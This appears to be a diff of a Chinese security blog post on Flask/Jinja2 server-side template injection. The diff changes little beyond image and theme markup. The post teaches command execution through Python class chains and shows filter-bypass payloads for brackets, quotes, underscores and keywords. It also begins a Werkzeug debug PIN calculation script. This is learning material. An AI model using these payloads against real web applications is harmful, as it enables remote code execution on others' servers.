+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%948.png"></p>
 <p>在这些模块中存在可以查看文件和命令执行的方法。</p>
 <p>常见方法快速查找表：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%9410.png"
-                     
-                ></p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%9410.png"></p>
 <h5 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h5><p>查找子类<code>_frozen_importib_external.Filel oader</code><br><code>&lt;class &#39; frozen_ jimportlib_ external.FileLoader&#39;&gt;</code></p>
 <p>可用有如下脚本：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%949.png"
-                     
-                ></p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%949.png"></p>
 <p>通过此脚本可以快速查看我们目标方法所在位置。</p>
 <h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><h5 id="内建函数eval执行命令"><a href="#内建函数eval执行命令" class="headerlink" title="内建函数eval执行命令"></a>内建函数eval执行命令</h5><p>内建函数：在python执行脚本时自动加载的函数，python脚本查看可利用eval命令执行。</p>
 <h5 id="os模块直接执行命令"><a href="#os模块直接执行命令" class="headerlink" title="os模块直接执行命令"></a>os模块直接执行命令</h5><p>在其他函数中执行os命令,在os模块当中存在os.system和两个执行系统命令的函数，下面诉一下这两个命令执行函数与subprocess.Popen函数的区别：</p>
@@ -567,25 +385,10 @@ p<span class="token punctuation">.</span>close<span class="token punctuation">(<
 <p>正常情况下不会将结果回显出来，于是我们用print将其输出出来。</p>
 <h5 id="getitem绕过中括号过滤"><a href="#getitem绕过中括号过滤" class="headerlink" title="getitem绕过中括号过滤"></a>getitem绕过中括号过滤</h5><p><code>__getitem__</code>魔术方法：getitem()是python中的一个魔术方法，对字典使用时，传入字符串，返回字典相对应键所对应的值；对列表使用时，传入整数返回列表对应索引的值。</p>
 <p>通过这个方法我们可以绕过中括号，以课程中给的靶场为例，我们正常输入会回显内容，但我们输入中括号，就会被过滤：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B7.png"
-                      alt="正常回显"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E4%B8%AD%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A41.png"
-                      alt="过滤"
-                ></p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B7.png" alt="正常回显"></p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E4%B8%AD%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A41.png" alt="过滤"></p>
 <p>这种时候我们之际用getitem方法替换中括号即可。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B72.png"
-                      alt="绕过"
-                ></p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B72.png" alt="绕过"></p>
 <p>接下来正常执行就行。</p>
 <h5 id="单双引号过滤和绕过"><a href="#单双引号过滤和绕过" class="headerlink" title="单双引号过滤和绕过"></a>单双引号过滤和绕过</h5><p><code>request</code>；他可以在flask中可以访问基于http请求传递的所有信息，此处的request并非python中的包，而是在flask内部的函数。</p>
 <p>以下是常见的方法：</p>
@@ -598,19 +401,9 @@ request.data       获取post传入的参数（Content-Type:a&#x2F;b）
 request.json       获取post传入的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>以视频中的靶场为例：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B71.png"
-                     
-                ></p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B71.png"></p>
 <p>构造的payload当中有单双引号存在时，就会被过滤，但假如我们利用request，就可以成功绕过，以<code>request.args.key</code>为例：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B72.png"
-                     
-                ></p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B72.png"></p>
 <p>这样，我们就可以从get传参中得到我们想要的值。其他的方式于上边演示的方法类似。</p>
 <h5 id="过滤器绕过下划线"><a href="#过滤器绕过下划线" class="headerlink" title="过滤器绕过下划线"></a>过滤器绕过下划线</h5><p>过滤器：过滤器通过管道符<code>|</code>与变量连接，并且在括号中可能有可选参数。</p>
 <p>flask常见过滤器：</p>
@@ -658,12 +451,7 @@ attr()					获取对象的属性<span aria-hidden="true" class="line-numbers-row
 </li>
 <li><p>使用过滤器（rever反转、replace替换、join拼接等）：<code>&#123;%set a="_ ssalc__ "Ireverse%&#125;&#123;&#123;a&#125;&#125;</code></p>
 <p>如下图： </p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4.png"
-                     
-                ></p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4.png"></p>
 </li>
 <li><p>利用python的char():<br><code>&#123;%sett chr=url_for.__globals__['__builtins__'].chr%&#125;&#123;&#123;""[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97 )%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;</code></p>
 </li>
@@ -700,12 +488,7 @@ session<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
 
 <h5 id="混合过滤"><a href="#混合过滤" class="headerlink" title="混合过滤"></a>混合过滤</h5><p>获取符号：</p>
 <p>当符号被过滤时，我们不但可以利用编码绕过，还可以利用flask内置函数和对象获取符号；</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A41.png"
-                     
-                ></p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A41.png"></p>
 <p>特点二：在部分情况回过滤下滑线和数字，那么<code>__getitem__</code>便无法使用，这时，我们可以用<code>pop</code>方法来替代此方法。</p>
 <h4 id="无回现ssti"><a href="#无回现ssti" class="headerlink" title="无回现ssti"></a>无回现ssti</h4><p>与无回现rce一样主要方法就，反弹shell，带外，盲注。用几道题来演示一下几种方法</p>
 <h2 id="debug-pin码计算"><a href="#debug-pin码计算" class="headerlink" title="debug pin码计算"></a>debug pin码计算</h2><p>pin码：对于有文件包含和文件读取的漏洞，且开启debug功能想要执行执行指令还需输入pin码，输入pin码之后可以输入命令值执行</p>
@@ -753,350 +536,4 @@ mod <span class="token operator">=</span> sys<span class="token punctuation">.</
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><strong>实操获取数据过程</strong>3</p>
-
-            </div>
-
-            
-                <div class="post-copyright-info">
-                    <div class="article-copyright-info-container">
-    <ul>
-        <li><strong>Title:</strong> ssti模板注入</li>
-        <li><strong>Author:</strong> 阿巴</li>
-        <li><strong>Created at:</strong> 2023-08-09 19:46:00</li>
-        
-            <li>
-                <strong>Updated at:</strong> 2023-09-27 18:11:45
-            </li>
-        
-        <li>
-            <strong>Link:</strong> https://redefine.ohevan.com/2023/08/09/SSTI模板注入/
-        </li>
-        <li>
-            <strong>License:</strong> This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
-        </li>
-    </ul>
-</div>
-
-                </div>
-            
-
-            
-                <ul class="post-tags-box">
-                    
-                        <li class="tag-item">
-                            <a href="/tags/web%E5%AE%89%E5%85%A8/">#web安全</a>&nbsp;
-                        </li>
-                    
-                </ul>
-            
-
-            
-
-            
-                <div class="article-nav">
-                    
-                        <div class="article-prev">
-                            <a class="prev"
-                            rel="prev"
-                            href="/2023/08/20/paython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"
-                            >
-                                <span class="left arrow-icon flex-center">
-                                    <i class="fa-solid fa-chevron-left"></i>
-                                </span>
-                                <span class="title flex-center">
-                                    <span class="post-nav-title-item">python沙箱逃逸</span>
-                                    <span class="post-nav-item">Prev posts</span>
-                                </span>
-                            </a>
-                        </div>
-                    
-                    
-                        <div class="article-next">
-                            <a class="next"
-                            rel="next"
-                            href="/2023/08/03/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%89/"
-                            >
-                                <span class="title flex-center">
-                                    <span class="post-nav-title-item">外部实体注入攻击（XXE）</span>
-                                    <span class="post-nav-item">Next posts</span>
-                                </span>
-                                <span class="right arrow-icon flex-center">
-                                    <i class="fa-solid fa-chevron-right"></i>
-                                </span>
-                            </a>
-                        </div>
-                    
-                </div>
-            
-
-
-            
-        </div>
-
-        
-            <div class="toc-content-container">
-                <div class="post-toc-wrap">
-    <div class="post-toc">
-        <div class="toc-title">On this page</div>
-        <div class="page-title">ssti模板注入</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="nav-text">SSTI模板注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#flask%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="nav-text">flask基本介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flask%E7%9A%84%E5%8F%98%E9%87%8F%E4%B8%8E%E6%96%B9%E6%B3%95"><span class="nav-text">flask的变量与方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flask%E6%A8%A1%E6%9D%BF%E4%BB%8B%E7%BB%8D"><span class="nav-text">flask模板介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">模板注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flask%E6%BC%8F%E6%B4%9E"><span class="nav-text">flask漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A4%E6%96%AD"><span class="nav-text">漏洞的判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E5%92%8C%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">继承关系和魔术方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#debug-pin%E7%A0%81%E8%AE%A1%E7%AE%97"><span class="nav-text">debug pin码计算</span></a></li></ol></li></ol>
-
-    </div>
-</div>
-            </div>
-        
-    </div>
-</div>
-
-
-                
-
-            </div>
-            
-            
-
-        </div>
-
-        <div class="main-content-footer">
-            <footer class="footer">
-    <div class="info-container">
-        <div class="copyright-info">
-            &copy;
-            
-              <span>Invalid date</span>
-              -
-            
-            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">阿巴</a>
-        </div>
-        
-            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-            <div class="website-count info-item">
-                
-                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
-                        VISITOR COUNT&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
-                    </span>
-                
-                
-                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
-                        TOTAL PAGE VIEWS&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
-                    </span>
-                
-            </div>
-        
-        <div class="theme-info info-item">
-            <span class="powered-by-container">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a></span>
-                <br>
-            <span class="theme-version-container">THEME&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.2.2</a>
-        </div>
-        
-        
-        
-            <div>
-                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
-            </div>
-        
-        
-        
-            <script async data-pjax>
-                try {
-                    function odometer_init() {
-                    const elements = document.querySelectorAll('.odometer');
-                    elements.forEach(el => {
-                        new Odometer({
-                            el,
-                            format: '( ddd).dd',
-                            duration: 200
-                        });
-                    });
-                    }
-                    odometer_init();
-                } catch (error) {}
-            </script>
-        
-        
-        
-    </div>  
-</footer>
-        </div>
-    </div>
-
-    
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="article-tools-list">
-        <!-- TOC aside toggle -->
-        
-            <li class="right-bottom-tools page-aside-toggle">
-                <i class="fa-regular fa-outdent"></i>
-            </li>
-        
-
-        <!-- go comment -->
-        
-    </ul>
-</div>
-
-        </div>
-    
-
-    <div class="right-side-tools-container">
-        <div class="side-tools-container">
-    <ul class="hidden-tools-list">
-        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
-            <i class="fa-regular fa-magnifying-glass-plus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
-            <i class="fa-regular fa-magnifying-glass-minus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-expand-width flex-center">
-            <i class="fa-regular fa-expand"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
-            <i class="fa-regular fa-moon"></i>
-        </li>
-
-        <!-- rss -->
-        
-
-        
-
-        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
-            <i class="fa-regular fa-arrow-down"></i>
-        </li>
-    </ul>
-
-    <ul class="visible-tools-list">
-        <li class="right-bottom-tools toggle-tools-list flex-center">
-            <i class="fa-regular fa-cog fa-spin"></i>
-        </li>
-        
-            <li class="right-bottom-tools tool-scroll-to-top flex-center">
-                <i class="arrow-up fas fa-arrow-up"></i>
-                <span class="percent"></span>
-            </li>
-        
-        
-    </ul>
-</div>
-
-    </div>
-
-    <div class="image-viewer-container">
-    <img src="">
-</div>
-
-
-    
-
-
-</main>
-
-
-
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/main.js"></script>
-
-<script src="/js/layouts/navbarShrink.js"></script>
-
-<script src="/js/tools/scrollTopBottom.js"></script>
-
-<script src="/js/tools/lightDarkSwitch.js"></script>
-
-
-
-
-
-    
-<script src="/js/tools/codeBlock.js"></script>
-
-
-
-
-    
-<script src="/js/layouts/lazyload.js"></script>
-
-
-
-
-    
-<script src="/js/tools/runtime.js"></script>
-
-    
-<script src="/js/libs/odometer.min.js"></script>
-
-    
-<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
-
-
-
-
-  
-<script src="/js/libs/Typed.min.js"></script>
-
-  
-<script src="/js/plugins/typed.js"></script>
-
-
-
-
-
-
-
-<div class="post-scripts pjax">
-    
-        
-<script src="/js/tools/tocToggle.js"></script>
-
-<script src="/js/libs/anime.min.js"></script>
-
-<script src="/js/layouts/toc.js"></script>
-
-<script src="/js/plugins/tabs.js"></script>
-
-    
-</div>
-
-
-    
-<script src="/js/libs/pjax.min.js"></script>
-
-<script>
-    window.addEventListener('DOMContentLoaded', () => {
-        window.pjax = new Pjax({
-            selectors: [
-                'head title',
-                '.page-container',
-                '.pjax',
-            ],
-            history: true,
-            debug: false,
-            cacheBust: false,
-            timeout: 0,
-            analytics: false,
-            currentUrlFullReload: false,
-            scrollRestoration: false,
-            // scrollTo: true,
-        });
-
-        document.addEventListener('pjax:send', () => {
-            Global.utils.pjaxProgressBarStart();
-        });
-
-        document.addEventListener('pjax:complete', () => {
-            Global.utils.pjaxProgressBarEnd();
-            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
-            Global.refresh();
-        });
-    });
-</script>
-
-
-
-
-</body>
-</html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">阿巴</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/08/09/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">http://example.com/2023/08/09/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/20/paython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="python沙箱逃逸"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">python沙箱逃逸</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/03/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%89/" title="外部实体注入攻击（XXE）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">外部实体注入攻击（XXE）</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/07/20/CTFshow_php%E7%89%B9%E6%80%A7/" title="ctfshow__PHP特性"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-20</div><div class="title">ctfshow__PHP特性</div></div></a></div><div><a href="/2023/08/20/Nepctf2023%E5%A4%8D%E7%8E%B0/" title="Nepctf2023复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-20</div><div class="title">Nepctf2023复现</div></div></a></div><div><a href="/2023/07/16/PHP%E7%89%B9%E6%80%A7/" title="PHP特性"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-16</div><div class="title">PHP特性</div></div></a></div><div><a href="/2023/08/03/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%89/" title="外部实体注入攻击（XXE）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-03</div><div class="title">外部实体注入攻击（XXE）</div></div></a></div><div><a href="/2023/08/03/ctfshow%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="ctfshow__反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-03</div><div class="title">ctfshow__反序列化</div></div></a></div><div><a href="/2023/08/20/ctfshow%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="ctfshow—命令执行"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-20</div><div class="title">ctfshow—命令执行</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">阿巴</div><div class="author-info__description">仰天大笑出门去，我辈岂是蓬蒿人</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">65</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SSTI模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#flask%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">flask基本介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E7%9A%84%E5%8F%98%E9%87%8F%E4%B8%8E%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.1.</span> <span class="toc-text">flask的变量与方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flask%E6%A8%A1%E6%9D%BF%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.</span> <span class="toc-text">flask模板介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.</span> <span class="toc-text">模板注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.1.</span> <span class="toc-text">flask漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A4%E6%96%AD"><span class="toc-number">1.3.2.</span> <span class="toc-text">漏洞的判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E5%92%8C%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.3.</span> <span class="toc-text">继承关系和魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">继承关系</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">常用注入模块详解</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.3.3.2.1.</span> <span class="toc-text">文件读取</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0eval%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.3.3.1.</span> <span class="toc-text">内建函数eval执行命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#os%E6%A8%A1%E5%9D%97%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.3.3.2.</span> <span class="toc-text">os模块直接执行命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#importlib%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span 